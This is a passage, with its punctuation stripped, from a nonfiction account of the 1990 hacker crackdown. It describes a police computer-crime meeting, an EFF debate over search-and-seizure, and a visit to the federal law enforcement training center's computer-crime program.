Internet Worm, for instance.   For years we'd been warning about that  but it's nothing compared to what's coming.   They expect horrors, these people.  They know that nothing will really get done until there is a horror.       Next day we heard an extensive briefing from a guy who'd been a computer cop, gotten into hot water with an Arizona city council, and now installed computer networks for a living  at a considerable rise in pay .  He talked about pulling fiber optic networks apart.    Even a single computer, with enough peripherals, is a literal  network   a bunch of machines all cabled together, generally with a complexity that puts stereo units to shame. FCIC people invent and publicize methods of seizing computers and maintaining their evidence.  Simple things, sometimes, but vital rules of thumb for street cops, who nowadays often stumble across a busy computer in the midst of a drug investigation or a white collar bust.  For instance   Photograph the system before you touch it.  Label the ends of all the cables before you detach anything.   Park  the heads on the disk drives before you move them.  Get the diskettes.  Don't put the diskettes in magnetic fields.  Don't write on diskettes with ballpoint pens.  Get the manuals.  Get the printouts.  Get the handwritten notes.  Copy data before you look at it, and then examine the copy instead of the original.    Now our lecturer distributed copied diagrams of a typical LAN or  Local Area Network , which happened to be out of Connecticut.  ONE HUNDRED AND FIFTY NINE desktop computers, each with its own peripherals.  Three  file servers.   Five  star couplers  each with thirty two ports.  One sixteen port coupler off in the corner office.  All these machines talking to each other, distributing electronic mail, distributing software, distributing, quite possibly, criminal evidence.  All linked by high capacity fiber optic cable.  A bad guy  cops talk a lot about  bad guys   might be lurking on PC  47 or  123 and distributing his ill doings onto some dupe's  personal  machine in another office  or another floor  or, quite possibly, two or three miles away!  Or, conceivably, the evidence might be  data  striped   split up into meaningless slivers stored, one by one, on a whole crowd of different disk drives.    The lecturer challenged us for solutions.  I for one was utterly clueless.  As far as I could figure, the Cossacks were at the gate  there were probably more disks in this single building than were seized during the entirety of Operation Sundevil.     Inside informant,  somebody said.  Right.  There's always the human angle, something easy to forget when contemplating the arcane recesses of high technology.  Cops are skilled at getting people to talk, and computer people, given a chair and some sustained attention, will talk about their computers till their throats go raw.  There's a case on record of a single question   How'd you do it    eliciting a forty five  minute videotaped confession from a computer criminal who not only completely incriminated himself but drew helpful diagrams.    Computer people talk.  Hackers BRAG.  Phone phreaks talk PATHOLOGICALLY  why else are they stealing phone codes, if not to natter for ten hours straight to their friends on an opposite seaboard   Computer literate people do in fact possess an arsenal of nifty gadgets and techniques that would allow them to conceal all kinds of exotic skullduggery, and if they could only SHUT UP about it, they could probably get away with all manner of amazing information crimes.  But that's just not how it works  or at least, that's not how it's worked SO FAR.    Most every phone phreak ever busted has swiftly implicated his mentors, his disciples, and his friends.  Most every white collar computer criminal, smugly convinced that his clever scheme is bulletproof, swiftly learns otherwise when, for the first time in his life, an actual no kidding policeman leans over, grabs the front of his shirt, looks him right in the eye and says    All right, ASSHOLE  you and me are going downtown!  All the hardware in the world will not insulate your nerves from these actual real life sensations of terror and guilt.    Cops know ways to get from point A to point Z without thumbing through every letter in some smart ass bad guy's alphabet.  Cops know how to cut to the chase.  Cops know a lot of things other people don't know.    Hackers know a lot of things other people don't know, too.  Hackers know, for instance, how to sneak into your computer through the phone lines.  But cops can show up RIGHT UP YOUR DOORSTEP and carry off YOU and your computer in separate steel boxes.  A cop interested in hackers can grab them and grill them. A hacker interested in cops has to depend on hearsay, underground legends, and what cops are willing to publicly reveal.  And the Secret Service didn't get named  the SECRET Service  because they blab a lot.    Some people, our lecturer informed us, were under the mistaken impression that it was  impossible  to tap a fiber optic line.  Well, he announced, he and his son had just whipped up a fiber optic tap in his workshop at home.  He passed it around the audience, along with a circuit covered LAN plug in card so we'd all recognize one if we saw it on a case.  We all had a look.    The tap was a classic  Goofy Prototype   a thumb length rounded metal cylinder with a pair of plastic brackets on it. From one end dangled three thin black cables, each of which ended in a tiny black plastic cap.  When you plucked the safety cap off the end of a cable, you could see the glass fiber  no thicker than a pinhole.    Our lecturer informed us that the metal cylinder was a  wavelength division multiplexer.   Apparently, what one did was to cut the fiber optic cable, insert two of the legs into the cut to complete the network again, and then read any passing data on the line by hooking up the third leg to some kind of monitor. Sounded simple enough.  I wondered why nobody had thought of it before.  I also wondered whether this guy's son back at the workshop had any teenage friends.    We had a break.  The guy sitting next to me was wearing a giveaway baseball cap advertising the Uzi submachine gun.  We had a desultory chat about the merits of Uzis.  Long a favorite of the Secret Service, it seems Uzis went out of fashion with the advent of the Persian Gulf War, our Arab allies taking some offense at Americans toting Israeli weapons.  Besides, I was informed by another expert, Uzis jam.  The equivalent weapon of choice today is the Heckler   Koch, manufactured in Germany.    The guy with the Uzi cap was a forensic photographer.  He also did a lot of photographic surveillance work in computer crime cases.  He used to, that is, until the firings in Phoenix. He was now a private investigator and, with his wife, ran a photography salon specializing in weddings and portrait photos. At  one must repeat  a considerable rise in income.    He was still FCIC.  If you were FCIC, and you needed to talk to an expert about forensic photography, well, there he was, willing and able.  If he hadn't shown up, people would have missed him.    Our lecturer had raised the point that preliminary investigation of a computer system is vital before any seizure is undertaken.  It's vital to understand how many machines are in there, what kinds there are, what kind of operating system they use, how many people use them, where the actual data itself is stored.  To simply barge into an office demanding  all the computers  is a recipe for swift disaster.    This entails some discreet inquiries beforehand.  In fact, what it entails is basically undercover work.  An intelligence operation.  SPYING, not to put too fine a point on it.    In a chat after the lecture, I asked an attendee whether  trashing  might work.    I received a swift briefing on the theory and practice of  trash covers.   Police  trash covers,  like  mail covers  or like wiretaps, require the agreement of a judge.  This obtained, the  trashing  work of cops is just like that of hackers, only more so and much better organized.  So much so, I was informed, that mobsters in Phoenix make extensive use of locked garbage cans picked up by a specialty high security trash company.    In one case, a tiger team of Arizona cops had trashed a local residence for four months.  Every week they showed up on the municipal garbage truck, disguised as garbagemen, and carried the contents of the suspect cans off to a shade tree, where they combed through the garbage  a messy task, especially considering that one of the occupants was undergoing kidney dialysis.  All useful documents were cleaned, dried and examined.  A discarded typewriter ribbon was an especially valuable source of data, as its long one strike ribbon of film contained the contents of every letter mailed out of the house.  The letters were neatly retyped by a police secretary equipped with a large desk mounted magnifying glass.    There is something weirdly disquieting about the whole subject of  trashing   an unsuspected and indeed rather disgusting mode of deep personal vulnerability.  Things that we pass by every day, that we take utterly for granted, can be exploited with so little work.  Once discovered, the knowledge of these vulnerabilities tend to spread.    Take the lowly subject of MANHOLE COVERS.  The humble manhole cover reproduces many of the dilemmas of computer  security in miniature.  Manhole covers are, of course, technological artifacts, access points to our buried urban infrastructure.  To the vast majority of us, manhole covers are invisible.  They are also vulnerable.  For many years now, the Secret Service has made a point of caulking manhole covers along all routes of the Presidential motorcade.  This is, of course, to deter terrorists from leaping out of underground ambush or, more likely, planting remote control car smashing bombs beneath the street.    Lately, manhole covers have seen more and more criminal exploitation, especially in New York City.  Recently, a telco in New York City discovered that a cable television service had been sneaking into telco manholes and installing cable service alongside the phone lines  WITHOUT PAYING ROYALTIES.  New York companies have also suffered a general plague of  a  underground copper cable theft   b  dumping of garbage, including toxic waste, and  c  hasty dumping of murder victims.    Industry complaints reached the ears of an innovative New England industrial security company, and the result was a new product known as  the Intimidator,  a thick titanium steel bolt with a precisely machined head that requires a special device to unscrew.  All these  keys  have registered serial numbers kept on file with the manufacturer.  There are now some thousands of these  Intimidator  bolts being sunk into American pavements wherever our President passes, like some macabre parody of strewn roses.  They are also spreading as fast as steel dandelions around US military bases and many centers of private industry.    Quite likely it has never occurred to you to peer under a manhole cover, perhaps climb down and walk around down there with a flashlight, just to see what it's like.  Formally speaking, this might be trespassing, but if you didn't hurt anything, and didn't make an absolute habit of it, nobody would really care. The freedom to sneak under manholes was likely a freedom you never intended to exercise.    You now are rather less likely to have that freedom at all.  You may never even have missed it until you read about it here, but if you're in New York City it's gone, and elsewhere it's likely going.  This is one of the things that crime, and the reaction to crime, does to us.    The tenor of the meeting now changed as the Electronic Frontier Foundation arrived.  The EFF, whose personnel and history will be examined in detail in the next chapter, are a pioneering civil liberties group who arose in direct response to the Hacker Crackdown of 1990.    Now Mitchell Kapor, the Foundation's president, and Michael Godwin, its chief attorney, were confronting federal law enforcement MANO A MANO for the first time ever.  Ever alert to the manifold uses of publicity, Mitch Kapor and Mike Godwin had brought their own journalist in tow   Robert Draper, from Austin, whose recent well received book about ROLLING STONE magazine was still on the stands.  Draper was on assignment for TEXAS MONTHLY.    The Steve Jackson EFF civil lawsuit against the Chicago Computer Fraud and Abuse Task Force was a matter of considerable regional interest in Texas.  There were now two Austinite journalists here on the case.  In fact, counting Godwin  a former Austinite and former journalist  there were three of us.  Lunch was like Old Home Week.    Later, I took Draper up to my hotel room.  We had a long frank talk about the case, networking earnestly like a miniature freelance journo version of the FCIC   privately confessing the numerous blunders of journalists covering the story, and trying hard to figure out who was who and what the hell was really going on out there.  I showed Draper everything I had dug out of the Hilton trashcan.  We pondered the ethics of  trashing  for a while, and agreed that they were dismal.  We also agreed that finding a SPRINT bill on your first time out was a heck of a coincidence.    First I'd  trashed   and now, mere hours later, I'd bragged to someone else.  Having entered the lifestyle of hackerdom, I was now, unsurprisingly, following its logic. Having discovered something remarkable through a surreptitious action, I of course HAD to  brag,  and to drag the passing Draper into my iniquities.  I felt I needed a witness.  Otherwise nobody would have believed what I'd discovered....    Back at the meeting, Thackeray cordially, if rather tentatively, introduced Kapor and Godwin to her colleagues. Papers were distributed.  Kapor took center stage.  The brilliant Bostonian high tech entrepreneur, normally the hawk in his own administration and quite an effective public speaker, seemed visibly nervous, and frankly admitted as much.  He began by saying he consided computer intrusion to be morally wrong, and that the EFF was not a  hacker defense fund,  despite what had appeared in print.  Kapor chatted a bit about the basic motivations of his group, emphasizing their good faith and willingness to listen and seek common ground with law enforcement  when, er, possible.    Then, at Godwin's urging, Kapor suddenly remarked that EFF's own Internet machine had been  hacked  recently, and that EFF did not consider this incident amusing.    After this surprising confession, things began to loosen up quite rapidly.  Soon Kapor was fielding questions, parrying objections, challenging definitions, and juggling paradigms with something akin to his usual gusto.    Kapor seemed to score quite an effect with his shrewd and skeptical analysis of the merits of telco  Caller ID  services.  On this topic, FCIC and EFF have never been at loggerheads, and have no particular established earthworks to defend.   Caller ID has generally been promoted as a privacy service for consumers, a presentation Kapor described as a  smokescreen,  the real point of Caller ID being to ALLOW CORPORATE CUSTOMERS TO BUILD EXTENSIVE COMMERCIAL DATABASES ON EVERYBODY WHO PHONES OR FAXES THEM.  Clearly, few people in the room had considered this possibility, except perhaps for two late arrivals from US WEST RBOC security, who chuckled nervously.    Mike Godwin then made an extensive presentation on  Civil Liberties Implications of Computer Searches and Seizures.   Now, at last, we were getting to the real nitty gritty here, real political horse trading.  The audience listened with close attention, angry mutters rising occasionally    He's trying to teach us our jobs!    We've been thinking about this for years! We think about these issues every day!    If I didn't seize the works, I'd be sued by the guy's victims!    I'm violating the law if I leave ten thousand disks full of illegal PIRATED SOFTWARE and STOLEN CODES!    It's our job to make sure people don't trash the Constitution  we're the DEFENDERS of the Constitution!    We seize stuff when we know it will be forfeited anyway as restitution for the victim!      If it's forfeitable, then don't get a search warrant, get a forfeiture warrant,  Godwin suggested coolly.  He further remarked that most suspects in computer crime don't WANT to see their computers vanish out the door, headed God knew where, for who knows how long.  They might not mind a search, even an extensive search, but they want their machines searched on site.     Are they gonna feed us   somebody asked sourly.     How about if you take copies of the data   Godwin parried.     That'll never stand up in court.      Okay, you make copies, give THEM the copies, and take the originals.     Hmmm.    Godwin championed bulletin board systems as repositories of First Amendment protected free speech.  He complained that federal computer crime training manuals gave boards a bad press, suggesting that they are hotbeds of crime haunted by pedophiles and crooks, whereas the vast majority of the nation's thousands of boards are completely innocuous, and nowhere near so romantically suspicious.    People who run boards violently resent it when their systems are seized, and their dozens  or hundreds  of users look on in abject horror.  Their rights of free expression are cut short.  Their right to associate with other people is infringed. And their privacy is violated as their private electronic mail becomes police property.    Not a soul spoke up to defend the practice of seizing boards.  The issue passed in chastened silence.  Legal principles aside   and those principles cannot be settled without laws passed or court precedents   seizing bulletin boards has become public relations poison for American computer police.    And anyway, it's not entirely necessary.  If you're a cop, you can get 'most everything you need from a pirate board, just by using an inside informant.  Plenty of vigilantes  well, CONCERNED CITIZENS  will inform police the moment they see a pirate board hit their area  and will tell the police all about it, in such technical detail, actually, that you kinda wish they'd shut up .  They will happily supply police with extensive downloads or printouts.  It's IMPOSSIBLE to keep this fluid electronic information out of the hands of police.    Some people in the electronic community become enraged at the prospect of cops  monitoring  bulletin boards.  This does have touchy aspects, as Secret Service people in particular examine bulletin boards with some regularity.  But to expect electronic police to be deaf dumb and blind in regard to this particular medium rather flies in the face of common sense. Police watch television, listen to radio, read newspapers and magazines  why should the new medium of boards be different  Cops can exercise the same access to electronic information as everybody else.  As we have seen, quite a few computer police maintain THEIR OWN bulletin boards, including anti hacker  sting  boards, which have generally proven quite effective.    As a final clincher, their Mountie friends in Canada  and colleagues in Ireland and Taiwan  don't have First Amendment or American constitutional restrictions, but they do have phone lines, and can call any bulletin board in America whenever they please.  The same technological determinants that play into the hands of hackers, phone phreaks and software pirates can play into the hands of police.   Technological determinants  don't have ANY human allegiances.  They're not black or white, or Establishment or Underground, or pro or anti anything.    Godwin complained at length about what he called  the Clever Hobbyist hypothesis   the assumption that the  hacker  you're busting is clearly a technical genius, and must therefore by searched with extreme thoroughness.  So   from the law's point of view, why risk missing anything   Take the works.  Take the guy's computer.  Take his books.  Take his notebooks.  Take the electronic drafts of his love letters.  Take his Walkman.  Take his wife's computer.  Take his dad's computer.  Take his kid sister's computer.  Take his employer's computer.  Take his compact disks  they MIGHT be CD ROM disks, cunningly disguised as pop music.  Take his laser printer  he might have hidden something vital in the printer's 5 meg of memory.  Take his software manuals and hardware documentation.  Take his science  fiction novels and his simulation gaming books.  Take his Nintendo Game Boy and his Pac Man arcade game.  Take his answering machine, take his telephone out of the wall.  Take anything remotely suspicious.    Godwin pointed out that most  hackers  are not, in fact, clever genius hobbyists.  Quite a few are crooks and grifters who don't have much in the way of technical sophistication  just some rule of thumb rip off techniques.  The same goes for most fifteen year olds who've downloaded a code scanning program from a pirate board.  There's no real need to seize everything in sight.  It doesn't require an entire computer system and ten thousand disks to prove a case in court.    What if the computer is the instrumentality of a crime  someone demanded.    Godwin admitted quietly that the doctrine of seizing the instrumentality of a crime was pretty well established in the American legal system.    The meeting broke up.  Godwin and Kapor had to leave. Kapor was testifying next morning before the Massachusetts Department Of Public Utility, about ISDN narrowband wide area networking.    As soon as they were gone, Thackeray seemed elated.  She had taken a great risk with this.  Her colleagues had not, in fact, torn Kapor and Godwin's heads off.  She was very proud of them, and told them so.     Did you hear what Godwin said about INSTRUMENTALITY OF A CRIME   she exulted, to nobody in particular.   Wow, that means MITCH ISN'T GOING TO SUE ME.        America's computer police are an interesting group.  As a social phenomenon they are far more interesting, and far more important, than teenage phone phreaks and computer hackers. First, they're older and wiser  not dizzy hobbyists with leaky morals, but seasoned adult professionals with all the responsibilities of public service.  And, unlike hackers, they possess not merely TECHNICAL power alone, but heavy duty legal and social authority.    And, very interestingly, they are just as much at sea in cyberspace as everyone else.  They are not happy about this. Police are authoritarian by nature, and prefer to obey rules and precedents.   Even those police who secretly enjoy a fast ride in rough territory will soberly disclaim any  cowboy  attitude.  But in cyberspace there ARE no rules and precedents.  They are groundbreaking pioneers, Cyberspace Rangers, whether they like it or not.    In my opinion, any teenager enthralled by computers, fascinated by the ins and outs of computer security, and attracted by the lure of specialized forms of knowledge and power, would do well to forget all about  hacking  and set his  or her  sights on becoming a fed.  Feds can trump hackers at almost every single thing hackers do, including gathering intelligence, undercover disguise, trashing, phone tapping, building dossiers, networking, and infiltrating computer systems   CRIMINAL computer systems.  Secret Service agents know more about phreaking, coding and carding than most phreaks can find out in years, and when it comes to viruses, break ins, software bombs and trojan horses, Feds have direct access to red hot confidential information that is only vague rumor in the underground.    And if it's an impressive public rep you're after, there are few people in the world who can be so chillingly impressive as a well trained, well armed United States Secret Service agent.    Of course, a few personal sacrifices are necessary in order to obtain that power and knowledge.  First, you'll have the galling discipline of belonging to a large organization  but the world of computer crime is still so small, and so amazingly fast  moving, that it will remain spectacularly fluid for years to come.  The second sacrifice is that you'll have to give up ripping people off.  This is not a great loss.  Abstaining from the use of illegal drugs, also necessary, will be a boon to your health.    A career in computer security is not a bad choice for a young man or woman today.  The field will almost certainly expand drastically in years to come.  If you are a teenager today, by the time you become a professional, the pioneers you have read about in this book will be the grand old men and women of the field, swamped by their many disciples and successors.  Of course, some of them, like William P. Wood of the 1865 Secret Service, may well be mangled in the whirring machinery of legal controversy  but by the time you enter the computer crime field, it may have stabilized somewhat, while remaining entertainingly challenging.    But you can't just have a badge.  You have to win it. First, there's the federal law enforcement training.  And it's hard  it's a challenge.  A real challenge  not for wimps and rodents.    Every Secret Service agent must complete gruelling courses at the Federal Law Enforcement Training Center.   In fact, Secret Service agents are periodically re trained during their entire careers.     In order to get a glimpse of what this might be like, I myself travelled to FLETC.       The Federal Law Enforcement Training Center is a 1500  acre facility on Georgia's Atlantic coast.  It's a milieu of marshgrass, seabirds, damp, clinging sea breezes, palmettos, mosquitos, and bats.  Until 1974, it was a Navy Air Base, and still features a working runway, and some WWII vintage blockhouses and officers' quarters.  The Center has since benefitted by a forty million dollar retrofit, but there's still enough forest and swamp on the facility for the Border Patrol to put in tracking practice.    As a town,  Glynco  scarcely exists.  The nearest real town is Brunswick, a few miles down Highway 17, where I stayed at the aptly named Marshview Holiday Inn.  I had Sunday dinner at a seafood restaurant called  Jinright's,  where I feasted on deep  fried alligator tail.  This local favorite was a heaped basket of bite sized chunks of white, tender, almost fluffy reptile meat, steaming in a peppered batter crust.  Alligator makes a culinary experience that's hard to forget, especially when liberally basted with homemade cocktail sauce from a Jinright squeeze  bottle.    The crowded clientele were tourists, fishermen, local black folks in their Sunday best, and white Georgian locals who all seemed to bear an uncanny resemblance to Georgia humorist Lewis Grizzard.    The 2,400 students from 75 federal agencies who make up the FLETC population scarcely seem to make a dent in the low key local scene.  The students look like tourists, and the teachers seem to have taken on much of the relaxed air of the Deep South. My host was Mr. Carlton Fitzpatrick, the Program Coordinator of the Financial Fraud Institute.  Carlton Fitzpatrick is a mustached, sinewy, well tanned Alabama native somewhere near his late forties, with a fondness for chewing tobacco, powerful computers, and salty, down home homilies.  We'd met before, at FCIC in Arizona.    The Financial Fraud Institute is one of the nine divisions at FLETC. Besides Financial Fraud, there's Driver   Marine, Firearms, and Physical Training.  These are specialized pursuits.  There are also five general training divisions   Basic Training, Operations, Enforcement Techniques, Legal Division, and Behavioral Science.    Somewhere in this curriculum is everything necessary to turn green college graduates into federal agents.  First they're given ID cards. Then they get the rather miserable looking blue coveralls known as  smurf suits.   The trainees are assigned a barracks and a cafeteria, and immediately set on FLETC's bone  grinding physical training routine.  Besides the obligatory daily jogging   the trainers run up danger flags beside the track when the humidity rises high enough to threaten heat stroke   there's the Nautilus machines, the martial arts, the survival skills....    The eighteen federal agencies who maintain on site academies at FLETC employ a wide variety of specialized law enforcement units, some of them rather arcane.  There's Border Patrol, IRS Criminal Investigation Division, Park Service, Fish and Wildlife, Customs, Immigration, Secret Service and the Treasury's uniformed subdivisions....  If you're a federal cop and you don't work for the FBI, you train at FLETC.  This includes people as apparently obscure as the agents of the Railroad Retirement Board Inspector General.  Or the Tennessee Valley Authority Police, who are in fact federal police officers, and can and do arrest criminals on the federal property of the Tennessee Valley Authority.    And then there are the computer crime people.  All sorts, all backgrounds.  Mr. Fitzpatrick is not jealous of his specialized knowledge.  Cops all over, in every branch of service, may feel a need to learn what he can teach.  Backgrounds don't matter much.  Fitzpatrick himself was originally a Border Patrol veteran, then became a Border Patrol instructor at FLETC. His Spanish is still fluent  but he found himself strangely fascinated when the first computers showed up at the Training Center.  Fitzpatrick did have a background in electrical engineering, and though he never considered himself a computer hacker, he somehow found himself writing useful little programs for this new and promising gizmo.    He began looking into the general subject of computers and crime, reading Donn Parker's books and articles, keeping an ear cocked for war stories, useful insights from the field, the up and coming people of the local computer crime and high  technology units....  Soon he got a reputation around FLETC as the resident  computer expert,  and that reputation alone brought him more exposure, more experience  until one day he looked around, and sure enough he WAS a federal computer crime expert.    In fact, this unassuming, genial man may be THE federal computer crime expert.  There are plenty of very good computer people, and plenty of very good federal investigators, but the area where these worlds of expertise overlap is very slim.  And Carlton Fitzpatrick has been right at the center of that since 1985, the first year of the Colluquy, a group which owes much to his influence.    He seems quite at home in his modest, acoustic tiled office, with its Ansel Adams style Western photographic art, a gold framed Senior Instructor Certificate, and a towering bookcase crammed with three ring binders with ominous titles such as DATAPRO REPORTS ON INFORMATION SECURITY and CFCA TELECOM SECURITY '90.    The phone rings every ten minutes  colleagues show up at the door to chat about new developments in locksmithing or to shake their heads over the latest dismal developments in the BCCI global banking scandal.    Carlton Fitzpatrick is a fount of computer crime war  stories, related in an acerbic drawl.  He tells me the colorful tale of a hacker caught in California some years back.  He'd been raiding systems, typing code without a detectable break, for twenty, twenty four, thirty six hours straight.  Not just logged on  TYPING.  Investigators were baffled.  Nobody could do that. Didn't he have to go to the bathroom   Was it some kind of automatic keyboard whacking device that could actually type code     A raid on the suspect's home revealed a situation of astonishing squalor.  The hacker turned out to be a Pakistani computer science student who had flunked out of a California university.  He'd gone completely underground as an illegal electronic immigrant, and was selling stolen phone service to stay alive.  The place was not merely messy and dirty, but in a state of psychotic disorder.  Powered by some weird mix of culture shock, computer addiction, and amphetamines, the suspect had in fact been sitting in front of his computer for a day and a half straight, with snacks and drugs at hand on the edge of his desk and a chamber pot under his chair.    Word about stuff like this gets around in the hacker  tracker community.    Carlton Fitzpatrick takes me for a guided tour by car around the FLETC grounds.  One of our first sights is the biggest indoor firing range in the world.  There are federal trainees in there, Fitzpatrick assures me politely, blasting away with a wide variety of automatic weapons  Uzis, Glocks, AK 47s....  He's willing to take me inside.  I tell him I'm sure that's really interesting, but I'd rather see his computers.  Carlton Fitzpatrick seems quite surprised and pleased.  I'm apparently the first journalist he's ever seen who has turned down the shooting gallery in favor of microchips.    Our next stop is a favorite with touring Congressmen  the three mile long FLETC driving range.  Here trainees of the Driver   Marine Division are taught high speed pursuit skills, setting and breaking road blocks, diplomatic security driving for VIP limousines....  A favorite FLETC pastime is to strap a passing Senator into the passenger seat beside a Driver   Marine trainer, hit a hundred miles an hour, then take it right into  the skid pan,  a section of greased track where two tons of Detroit iron can whip and spin like a hockey puck.    Cars don't fare well at FLETC.  First they're rifled again and again for search practice.  Then they do 25,000 miles of high speed pursuit training  they get about seventy miles per set of steel belted radials.  Then it's off to the skid pan, where sometimes they roll and tumble headlong in the grease. When they're sufficiently grease stained, dented, and creaky, they're sent to the roadblock unit, where they're battered without pity.  And finally then they're sacrificed to the Bureau of Alcohol, Tobacco and Firearms, whose trainees learn the ins and outs of car bomb work by blowing them into smoking wreckage.    There's a railroad box car on the FLETC grounds, and a large grounded boat, and a propless plane  all training grounds for searches.  The plane sits forlornly on a patch of weedy tarmac next to an eerie blockhouse known as the  ninja compound,  where anti terrorism specialists practice hostage rescues.  As I gaze on this creepy paragon of modern low intensity warfare, my nerves are jangled by a sudden staccato outburst of automatic weapons fire, somewhere in the woods to my right.   Nine  millimeter,  Fitzpatrick judges calmly.    Even the eldritch ninja compound pales somewhat compared to the truly surreal area known as  the raid houses.   This is a street lined on both sides with nondescript concrete block houses with flat pebbled roofs.  They were once officers' quarters.  Now they are training grounds.  The first one to our left, Fitzpatrick tells me, has been specially adapted for computer search and seizure practice.  Inside it has been wired for video from top to bottom, with eighteen pan and tilt remotely controlled videocams mounted on walls and in corners.  Every movement of the trainee agent is recorded live by teachers, for later taped analysis.  Wasted movements, hesitations, possibly lethal tactical mistakes  all are gone over in detail.    Perhaps the weirdest single aspect of this building is its front door, scarred and scuffed all along the bottom, from the repeated impact, day after day, of federal shoe leather.    Down at the far end of the row of raid houses some people are practicing a murder.  We drive by slowly as some very young and rather nervous looking federal trainees interview a heavyset bald man on the raid house lawn.  Dealing with murder takes a lot of practice  first you have to learn to control your own instinctive disgust and panic, then you have to learn to control the reactions of a nerve shredded crowd of civilians, some of whom may have just lost a loved one, some of whom may be murderers  quite possibly both at once.    A dummy plays the corpse.  The roles of the bereaved, the morbidly curious, and the homicidal are played, for pay, by local Georgians   waitresses, musicians, most anybody who needs to moonlight and can learn a script.  These people, some of whom are FLETC regulars year after year, must surely have one of the strangest jobs in the world.    Something about the scene    normal  people in a weird situation, standing around talking in bright Georgia sunshine, unsuccessfully pretending that something dreadful has gone on, while a dummy lies inside on faked bloodstains....  While behind this weird masquerade, like a nested set of Russian dolls, are grim future realities of real death, real violence, real murders of real people, that these young agents will really investigate, many times during their careers....  Over and over....  Will those anticipated murders look like this, feel like this  not as  real  as these amateur actors are trying to make it seem, but both as  real,  and as numbingly unreal, as watching fake people standing around on a fake lawn   Something about this scene unhinges me.  It seems nightmarish to me, Kafkaesque.  I simply don't know how to take it  my head is turned around  I don't know whether to laugh, cry, or just shudder.    When the tour is over, Carlton Fitzpatrick and I talk about computers.  For the first time cyberspace seems like quite a comfortable place.  It seems very real to me suddenly, a place where I know what I'm talking about, a place I'm used to.  It's real.   Real.   Whatever.    Carlton Fitzpatrick is the only person I've met in cyberspace circles who is happy with his present equipment.  He's got a 5 Meg RAM PC with a 112 meg hard disk  a 660 meg's on the way.  He's got a Compaq 386 desktop, and a Zenith 386 laptop with 120 meg.  Down the hall is a NEC Multi Sync 2A with a CD ROM drive and a 9600 baud modem with four com lines.  There's a training minicomputer, and a 10 meg local mini just for the Center, and a lab full of student PC clones and half a dozen Macs or so.  There's a Data General MV 2500 with 8 meg on board and a 370 meg disk.    Fitzpatrick plans to run a UNIX board on the Data General when he's finished beta testing the software for it, which he wrote himself.  It'll have E mail features, massive files on all manner of computer crime and investigation procedures, and will follow the computer security specifics of the Department of Defense  Orange Book.   He thinks it will be the biggest BBS in the federal government.    Will it have PHRACK on it   I ask wryly.    Sure, he tells me.  PHRACK, _TAP_, COMPUTER UNDERGROUND DIGESTM, all that stuff.  With proper disclaimers, of course.    I ask him if he plans to be the sysop.  Running a system that size is very time consuming, and Fitzpatrick teaches two three hour courses every day.    No, he says seriously, FLETC has to get its money worth out of the instructors.  He thinks he can get a local volunteer to do it, a high school student.    He says a bit more, something I think about an Eagle Scout law enforcement liaison program, but my mind has rocketed off in disbelief.     You're going to put a TEENAGER in charge of a federal security BBS    I'm speechless.  It hasn't escaped my notice that the FLETC Financial Fraud Institute is the ULTIMATE hacker  trashing target  there is stuff in here, stuff of such utter and consummate cool by every standard of the digital underground.... I imagine the hackers of my acquaintance, fainting dead away from forbidden knowledge greed fits, at the mere prospect of cracking the superultra top secret computers used to train the Secret Service in computer crime....     Uhm, Carlton,  I babble,  I'm sure he's a really nice kid and all, but that's a terrible temptation to set in front of somebody who's, you know, into computers and just starting out...      Yeah,  he says,  that did occur to me.   For the first time I begin to suspect that he's pulling my leg.    He seems proudest when he shows me an ongoing project called JICC, Joint Intelligence Control Council.  It's based on the services provided by EPIC, the El Paso Intelligence Center, which supplies data and intelligence to the Drug Enforcement Administration, the Customs Service, the Coast Guard, and the state police of the four southern border states.  Certain EPIC files can now be accessed by drug enforcement police of Central America, South America and the Caribbean, who can also trade information among themselves.  Using a telecom program called  White Hat,  written by two brothers named Lopez from the Dominican Republic, police can now network internationally on inexpensive PCs.  Carlton Fitzpatrick is teaching a class of drug war agents from the Third World, and he's very proud of their progress.  Perhaps soon the sophisticated smuggling networks of the Medellin Cartel will be matched by a sophisticated computer network of the Medellin Cartel's sworn enemies.  They'll track boats, track contraband, track the international drug lords who now leap over borders with great ease, defeating the police through the clever use of fragmented national jurisdictions.    JICC and EPIC must remain beyond the scope of this book. They seem to me to be very large topics fraught with complications that I am not fit to judge.  I do know, however, that the international, computer assisted networking of police, across national boundaries, is something that Carlton Fitzpatrick considers very important, a harbinger of a desirable future.  I also know that networks by their nature ignore physical boundaries.  And I also know that where you put communications you put a community, and that when those communities become self  aware they will fight to preserve themselves and to expand their influence.  I make no judgements whether this is good or bad. It's just cyberspace  it's just the way things are.    I asked Carlton Fitzpatrick what advice he would have for a twenty year old who wanted to shine someday in the world of electronic law enforcement.    He told me that the number one rule was simply not to be scared of computers.  You don't need to be an obsessive  computer weenie,  but you mustn't be buffaloed just because some machine looks fancy.  The advantages computers give smart crooks are matched by the advantages they give smart cops.  Cops in the future will have to enforce the law  with their heads, not their holsters.   Today you can make good cases without ever leaving your office.  In the future, cops who resist the computer revolution will never get far beyond walking a beat.    I asked Carlton Fitzpatrick if he had some single message for the public  some single thing that he would most like the American public to know about his work.    He thought about it while.   Yes,  he said finally.  TELL me the rules, and I'll TEACH those rules!   He looked me straight in the eye.   I do the best that I can.      PART FOUR   THE CIVIL LIBERTARIANS     The story of the Hacker Crackdown, as we have followed it thus far, has been technological, subcultural, criminal and legal.  The story of the Civil Libertarians, though it partakes of all those other aspects, is profoundly and thoroughly POLITICAL.    In 1990, the obscure, long simmering struggle over the ownership and nature of cyberspace became loudly and irretrievably public.  People from some of the oddest corners of American society suddenly found themselves public figures.  Some of these people found this situation much more than they had ever bargained for.  They backpedalled, and tried to retreat back to the mandarin obscurity of their cozy subcultural niches.  This was generally to prove a mistake.    But the civil libertarians seized the day in 1990.  They found themselves organizing, propagandizing, podium pounding, persuading, touring, negotiating, posing for publicity photos, submitting to interviews, squinting in the limelight as they tried a tentative, but growingly sophisticated, buck and wing upon the public stage.    It's not hard to see why the civil libertarians should have this competitive advantage.    The hackers of the digital underground are an hermetic elite.  They find it hard to make any remotely convincing case for their actions in front of the general public.  Actually, hackers roundly despise the  ignorant  public, and have never trusted the judgement of  the system.   Hackers do propagandize, but only among themselves, mostly in giddy, badly spelled manifestos of class warfare, youth rebellion or naive techie utopianism.  Hackers must strut and boast in order to establish and preserve their underground reputations.  But if they speak out too loudly and publicly, they will break the fragile surface  tension of the underground, and they will be harrassed or arrested.  Over the longer term, most hackers stumble, get busted, get betrayed, or simply give up.  As a political force, the digital underground is hamstrung.    The telcos, for their part, are an ivory tower under protracted seige.  They have 